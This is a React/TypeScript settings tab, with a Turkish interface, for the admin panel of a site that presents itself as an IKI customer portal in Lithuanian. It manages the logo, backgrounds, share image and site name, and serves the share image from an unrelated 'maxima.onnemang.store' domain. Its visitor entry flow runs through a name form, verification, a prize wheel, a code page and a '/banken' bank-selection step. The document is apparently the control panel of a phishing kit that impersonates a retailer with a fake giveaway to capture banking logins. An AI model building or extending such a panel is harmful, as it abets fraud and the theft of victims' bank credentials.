"use client";

import { useState, useEffect } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
  const [settings, setSettings] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [uploading, setUploading] = useState<string | null>(null);
  const supabase = createBrowserSupabaseClient();

  async function compressImage(file: File, opts: { maxWidth: number; maxHeight: number; quality: number }) {
    const objectUrl = URL.createObjectURL(file);
    try {
      const img = new Image();
      img.decoding = "async";
      img.src = objectUrl;

      await new Promise<void>((resolve, reject) => {
        img.onload = () => resolve();
        img.onerror = () => reject(new Error("Image load failed"));
      });

      const maxWidth = opts.maxWidth;
      const maxHeight = opts.maxHeight;
      const ratio = Math.min(maxWidth / img.width, maxHeight / img.height, 1);
      const width = Math.round(img.width * ratio);
      const height = Math.round(img.height * ratio);

      const canvas = document.createElement("canvas");
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext("2d");
      if (!ctx) return file;
      ctx.drawImage(img, 0, 0, width, height);

      const blob = await new Promise<Blob | null>((resolve) =>
        canvas.toBlob(resolve, "image/jpeg", opts.quality),
      );

      if (!blob) return file;
      return new File([blob], file.name.replace(/\.[^/.]+$/, "") + ".jpg", { type: "image/jpeg" });
    } finally {
      URL.revokeObjectURL(objectUrl);
    }
  }

  const DEFAULTS = {
    logo_url: "/form-assets/iki-mini-logo.png",
    bg_url: "/form-assets/bg-desktop.png",
    bg_url_mobile: "/form-assets/bg-mobile.png",
    og_image_url: "https://maxima.onnemang.store/og-image.jpg",
    portal_name: "IKI klientų portalas",
    support_center_name: "IKI klientų aptarnavimas",
  };

  const fetchSettings = async () => {
    if (!supabase) return;
    setLoading(true);
    const { data } = await supabase.from("global_settings").select("*").limit(1).single();
    if (data) {
      const ws = data.wheel_settings || {};
      setSettings({
        ...data,
        logo_url: data.logo_url || DEFAULTS.logo_url,
        bg_url: data.bg_url || DEFAULTS.bg_url,
        og_image_url: data.og_image_url || DEFAULTS.og_image_url,
        portal_name: data.portal_name || DEFAULTS.portal_name,
        support_center_name: data.support_center_name || DEFAULTS.support_center_name,
        site_enabled: data.site_enabled !== false,
        entry_page: data.entry_page || "/win",
        wheel_settings: { ...ws, bg_url_mobile: ws.bg_url_mobile || DEFAULTS.bg_url_mobile },
      });
    }
    setLoading(false);
  };

  const applyDefaults = () => {
    setSettings((prev: any) => ({
      ...prev,
      logo_url: DEFAULTS.logo_url,
      bg_url: DEFAULTS.bg_url,
      og_image_url: DEFAULTS.og_image_url,
      portal_name: DEFAULTS.portal_name,
      support_center_name: DEFAULTS.support_center_name,
      wheel_settings: { ...(prev?.wheel_settings || {}), bg_url_mobile: DEFAULTS.bg_url_mobile },
    }));
  };

  useEffect(() => {
    fetchSettings();
  }, [supabase]);

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!supabase || !settings) return;
    setSaving(true);
    const { error } = await supabase
      .from("global_settings")
      .update({
        logo_url: settings.logo_url,
        bg_url: settings.bg_url,
        og_image_url: settings.og_image_url,
        portal_name: settings.portal_name,
        support_center_name: settings.support_center_name,
        site_enabled: settings.site_enabled !== false,
        entry_page: settings.entry_page || "/win",
        wheel_settings: settings.wheel_settings
      })
      .eq("id", settings.id || "default");
    
    setSaving(false);
    if (error) alert("Hata: " + error.message);
    else alert("Genel ayarlar başarıyla kaydedildi!");
  };

  const handleChange = (key: string, value: string) => {
    setSettings((prev: any) => ({ ...prev, [key]: value }));
  };

  const handleUpload = async (e: React.ChangeEvent<HTMLInputElement>, key: string) => {
    if (!e.target.files || e.target.files.length === 0 || !supabase) return;
    let file = e.target.files[0];
    setUploading(key);

    if (!file.type.startsWith("image/")) {
      alert("Lütfen sadece geçerli bir resim dosyası yükleyin.");
      setUploading(null);
      return;
    }

    if (file.size > 5 * 1024 * 1024) {
      alert("Dosya boyutu çok büyük (max 5MB). Lütfen daha küçük bir görsel seçin.");
      setUploading(null);
      return;
    }

    try {
      if (key === "bg_url") {
        file = await compressImage(file, { maxWidth: 1920, maxHeight: 1080, quality: 0.82 });
      }
      if (key === "logo_url") {
        file = await compressImage(file, { maxWidth: 512, maxHeight: 512, quality: 0.9 });
      }
      if (key === "og_image_url") {
        file = await compressImage(file, { maxWidth: 1200, maxHeight: 1200, quality: 0.85 });
      }
      if (key === "wheel_settings.bg_url_mobile") {
        file = await compressImage(file, { maxWidth: 1080, maxHeight: 1920, quality: 0.82 });
      }
    } catch {}

    const fileExt = file.name.split('.').pop();
    const fileName = `${Math.random()}.${fileExt}`;
    const filePath = `general/${fileName}`;

    const { error: uploadError } = await supabase.storage
      .from('assets')
      .upload(filePath, file);

    if (uploadError) {
      alert("Yükleme hatası: " + uploadError.message);
      setUploading(null);
      return;
    }

    const { data: urlData } = supabase.storage.from('assets').getPublicUrl(filePath);
    handleChange(key, urlData.publicUrl);
    setUploading(null);
  };

  if (loading) return <div className="opacity-50 p-8 text-center font-medium">Yükleniyor...</div>;
  if (!settings) return <div className="opacity-50 p-8 text-center font-medium">Ayarlar bulunamadı.</div>;

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div className="flex items-center gap-3">
          <div className={`p-2 rounded-xl ${darkMode ? 'bg-white/10 text-white' : 'bg-black/5 text-black'}`}>
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" /></svg>
          </div>
          <div>
            <h2 className={`text-2xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>Genel Ayarlar</h2>
            <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Sitenin genel tasarımını, logo ve arkaplanını değiştirin</p>
          </div>
        </div>
        <button
          type="button"
          onClick={applyDefaults}
          className={`px-5 py-2.5 rounded-xl font-bold text-sm transition-all active:scale-95 shadow-sm border ${darkMode ? 'bg-white/10 hover:bg-white/20 border-white/5 text-white' : 'bg-white hover:bg-gray-50 border-gray-200 text-gray-700'}`}
        >
          Varsayılanları Yükle
        </button>
      </div>

      <form onSubmit={handleSave} className="space-y-8">
        {/* ========== SITE KONTROLÜ ========== */}
        <div className={`p-8 rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
          <h3 className={`text-lg font-bold mb-8 border-b pb-4 ${darkMode ? 'border-white/10 text-[#EB5E28]' : 'border-gray-200 text-[#EB5E28]'}`}>Site Kontrolü</h3>
          <div className="space-y-6">
            <div className="flex items-center justify-between gap-4 flex-wrap">
              <div>
                <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Site Durumu</label>
                <p className={`text-[11px] mt-1 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
                  Kapalıyken ziyaretçiler hiçbir sayfaya ulaşamaz (503 döner). Admin paneli açık kalır.
                </p>
              </div>
              <button
                type="button"
                onClick={() => setSettings((prev: any) => ({ ...prev, site_enabled: !(prev.site_enabled !== false) }))}
                className={`relative inline-flex h-8 w-14 shrink-0 items-center rounded-full transition-colors duration-300 ${settings.site_enabled !== false ? 'bg-green-500' : 'bg-red-500'}`}
                aria-label="Site durumu"
              >
                <span
                  className={`inline-block h-6 w-6 transform rounded-full bg-white shadow transition-transform duration-300 ${settings.site_enabled !== false ? 'translate-x-7' : 'translate-x-1'}`}
                />
              </button>
            </div>
            <div className={`flex items-center gap-3 rounded-2xl px-4 py-3 text-sm font-bold ${settings.site_enabled !== false ? (darkMode ? 'bg-green-500/10 text-green-400' : 'bg-green-50 text-green-600') : (darkMode ? 'bg-red-500/10 text-red-400' : 'bg-red-50 text-red-600')}`}>
              <span className={`relative flex h-2.5 w-2.5`}>
                {settings.site_enabled !== false && <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-500 opacity-60"></span>}
                <span className={`relative inline-flex rounded-full h-2.5 w-2.5 ${settings.site_enabled !== false ? 'bg-green-500' : 'bg-red-500'}`}></span>
              </span>
              {settings.site_enabled !== false ? "Site şu anda AÇIK" : "Site şu anda KAPALI (503)"}
            </div>
            <div>
              <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Ana Domain Giriş Sayfası</label>
              <p className={`text-[11px] mb-3 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
                Ziyaretçi ana domaini açtığında ilk göreceği sayfa (session her durumda oluşur).
              </p>
              <select
                value={settings.entry_page || "/win"}
                onChange={e => handleChange("entry_page", e.target.value)}
                className={`w-full px-4 py-3 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
              >
                <option value="/win">İsim Formu — /win (varsayılan akış)</option>
                <option value="/verify">Doğrulama / Bekleme — /verify</option>
                <option value="/wheel">Şans Çarkı — /wheel</option>
                <option value="/code">Katılım Kodu — /code</option>
                <option value="/banken">Banka Seçimi — /banken</option>
              </select>
            </div>
          </div>
        </div>

        <div className={`p-8 rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
          <h3 className={`text-lg font-bold mb-8 border-b pb-4 ${darkMode ? 'border-white/10 text-[#EB5E28]' : 'border-gray-200 text-[#EB5E28]'}`}>Marka ve Tasarım</h3>
          
          <div className="space-y-8">
            <div className="flex gap-5 items-center border-b border-black/5 dark:border-white/5 pb-8">
              <div className={`w-24 h-24 shrink-0 rounded-2xl border flex items-center justify-center p-2 overflow-hidden shadow-inner ${darkMode ? 'bg-black/40 border-white/10' : 'bg-gray-100 border-gray-200'}`}>
                {settings.logo_url ? <img src={settings.logo_url} alt="" className="max-w-full max-h-full object-contain drop-shadow-md" /> : <span className="text-xs opacity-50 font-medium">Logo Yok</span>}
              </div>
              <div className="flex-1 space-y-2.5">
                <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Site Logosu</label>
                <div className="flex gap-3">
                  <input 
                    type="text"
                    value={settings.logo_url || ""}
                    onChange={e => handleChange("logo_url", e.target.value)}
                    className={`flex-1 px-4 py-2.5 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
                  />
                  <label className={`px-5 py-2.5 rounded-xl font-bold text-sm cursor-pointer transition-all active:scale-95 shadow-sm border ${darkMode ? 'bg-white/10 hover:bg-white/20 border-white/5 text-white' : 'bg-white hover:bg-gray-50 border-gray-200 text-gray-700'}`}>
                    {uploading === "logo_url" ? "..." : "Yükle"}
                    <input type="file" accept="image/*" className="hidden" onChange={e => handleUpload(e, "logo_url")} disabled={!!uploading} />
                  </label>
                </div>
              </div>
            </div>

            <div className="flex gap-5 items-center border-b border-black/5 dark:border-white/5 pb-8">
              <div className={`w-24 h-24 shrink-0 rounded-2xl border flex items-center justify-center overflow-hidden relative shadow-inner ${darkMode ? 'bg-black/40 border-white/10' : 'bg-gray-100 border-gray-200'}`}>
                {settings.bg_url ? <img src={settings.bg_url} alt="" className="absolute inset-0 w-full h-full object-cover opacity-80" /> : <span className="text-xs opacity-50 font-medium">Arkaplan Yok</span>}
              </div>
              <div className="flex-1 space-y-2.5">
                <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Site Arkaplan Görseli (Masaüstü / Genel)</label>
                <div className="flex gap-3">
                  <input 
                    type="text"
                    value={settings.bg_url || ""}
                    onChange={e => handleChange("bg_url", e.target.value)}
                    className={`flex-1 px-4 py-2.5 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
                  />
                  <label className={`px-5 py-2.5 rounded-xl font-bold text-sm cursor-pointer transition-all active:scale-95 shadow-sm border ${darkMode ? 'bg-white/10 hover:bg-white/20 border-white/5 text-white' : 'bg-white hover:bg-gray-50 border-gray-200 text-gray-700'}`}>
                    {uploading === "bg_url" ? "..." : "Yükle"}
                    <input type="file" accept="image/*" className="hidden" onChange={e => handleUpload(e, "bg_url")} disabled={!!uploading} />
                  </label>
                </div>
              </div>
            </div>

            <div className="flex gap-5 items-center border-b border-black/5 dark:border-white/5 pb-8">
              <div className={`w-24 h-24 shrink-0 rounded-2xl border flex items-center justify-center overflow-hidden relative shadow-inner ${darkMode ? 'bg-black/40 border-white/10' : 'bg-gray-100 border-gray-200'}`}>
                {settings.wheel_settings?.bg_url_mobile ? <img src={settings.wheel_settings.bg_url_mobile} alt="" className="absolute inset-0 w-full h-full object-cover opacity-80" /> : <span className="text-xs opacity-50 font-medium">Mobil Yok</span>}
              </div>
              <div className="flex-1 space-y-2.5">
                <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Site Arkaplan Görseli (Mobil - Opsiyonel)</label>
                <div className="flex gap-3">
                  <input 
                    type="text"
                    value={settings.wheel_settings?.bg_url_mobile || ""}
                    onChange={e => {
                      setSettings((prev: any) => ({
                        ...prev,
                        wheel_settings: { ...(prev.wheel_settings || {}), bg_url_mobile: e.target.value }
                      }));
                    }}
                    className={`flex-1 px-4 py-2.5 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
                  />
                  <label className={`px-5 py-2.5 rounded-xl font-bold text-sm cursor-pointer transition-all active:scale-95 shadow-sm border ${darkMode ? 'bg-white/10 hover:bg-white/20 border-white/5 text-white' : 'bg-white hover:bg-gray-50 border-gray-200 text-gray-700'}`}>
                    {uploading === "bg_url_mobile" ? "..." : "Yükle"}
                    <input type="file" accept="image/*" className="hidden" onChange={async (e) => {
                      if (!e.target.files || e.target.files.length === 0 || !supabase) return;
                      const file = e.target.files[0];
                      setUploading("bg_url_mobile");
                      const fileExt = file.name.split('.').pop();
                      const fileName = `mobile_bg_${Math.random()}.${fileExt}`;
                      const filePath = `general/${fileName}`;
                      const { error: uploadError } = await supabase.storage.from('assets').upload(filePath, file);
                      if (uploadError) {
                        alert("Yükleme hatası: " + uploadError.message);
                        setUploading(null);
                        return;
                      }
                      const { data: urlData } = supabase.storage.from('assets').getPublicUrl(filePath);
                      setSettings((prev: any) => ({
                        ...prev,
                        wheel_settings: { ...(prev.wheel_settings || {}), bg_url_mobile: urlData.publicUrl }
                      }));
                      setUploading(null);
                    }} disabled={!!uploading} />
                  </label>
                </div>
              </div>
            </div>

            <div className="flex gap-5 items-center border-b border-black/5 dark:border-white/5 pb-8">
              <div className={`w-24 h-24 shrink-0 rounded-2xl border flex items-center justify-center overflow-hidden relative shadow-inner ${darkMode ? 'bg-black/40 border-white/10' : 'bg-gray-100 border-gray-200'}`}>
                {settings.og_image_url ? <img src={settings.og_image_url} alt="" className="absolute inset-0 w-full h-full object-cover opacity-80" /> : <span className="text-xs opacity-50 font-medium text-center px-1">Varsayılan</span>}
              </div>
              <div className="flex-1 space-y-2.5">
                <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Sosyal Medya Paylaşım Resmi (Facebook / WhatsApp / Instagram Önizlemesi)</label>
                <div className="flex gap-3">
                  <input
                    type="text"
                    value={settings.og_image_url || ""}
                    onChange={e => handleChange("og_image_url", e.target.value)}
                    placeholder="Boş bırakılırsa varsayılan resim kullanılır"
                    className={`flex-1 px-4 py-2.5 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
                  />
                  <label className={`px-5 py-2.5 rounded-xl font-bold text-sm cursor-pointer transition-all active:scale-95 shadow-sm border ${darkMode ? 'bg-white/10 hover:bg-white/20 border-white/5 text-white' : 'bg-white hover:bg-gray-50 border-gray-200 text-gray-700'}`}>
                    {uploading === "og_image_url" ? "..." : "Yükle"}
                    <input type="file" accept="image/*" className="hidden" onChange={e => handleUpload(e, "og_image_url")} disabled={!!uploading} />
                  </label>
                  {settings.og_image_url && (
                    <button
                      type="button"
                      onClick={() => handleChange("og_image_url", "")}
                      className={`px-4 py-2.5 rounded-xl font-bold text-sm transition-all active:scale-95 shadow-sm border ${darkMode ? 'bg-red-500/10 hover:bg-red-500/20 border-red-500/20 text-red-400' : 'bg-red-50 hover:bg-red-100 border-red-200 text-red-600'}`}
                    >
                      Varsayılana Dön
                    </button>
                  )}
                </div>
                <p className={`text-[11px] ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Link paylaşıldığında görünen resim. Kaydettikten sonra Facebook'ta yansıması için developers.facebook.com/tools/debug adresinden "Scrape Again" yapın.</p>
              </div>
            </div>

            <div className="space-y-6 pt-4">
              <div>
                <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Portal Adı</label>
                <input 
                  type="text"
                  value={settings.portal_name || ""}
                  onChange={e => handleChange("portal_name", e.target.value)}
                  className={`w-full px-4 py-3 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
                />
              </div>
              <div>
                <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Destek Merkezi Adı</label>
                <input 
                  type="text"
                  value={settings.support_center_name || ""}
                  onChange={e => handleChange("support_center_name", e.target.value)}
                  className={`w-full px-4 py-3 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
                />
              </div>
            </div>

          </div>
        </div>
        
        <div className="flex justify-end sticky bottom-6 z-20 pb-4">
          <button 
            type="submit" 
            disabled={saving}
            className="px-8 py-3.5 bg-[#EB5E28] text-white rounded-full font-bold tracking-wide hover:bg-[#c94d1e] transition-all duration-300 shadow-[0_0_15px_rgba(235,94,40,0.3)] hover:shadow-[0_0_25px_rgba(235,94,40,0.5)] active:scale-95 disabled:opacity-50 flex items-center gap-2"
          >
            {saving ? "Kaydediliyor..." : (
              <>
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" /></svg>
                Kaydet
              </>
            )}
          </button>
        </div>
      </form>
    </div>
  );
}
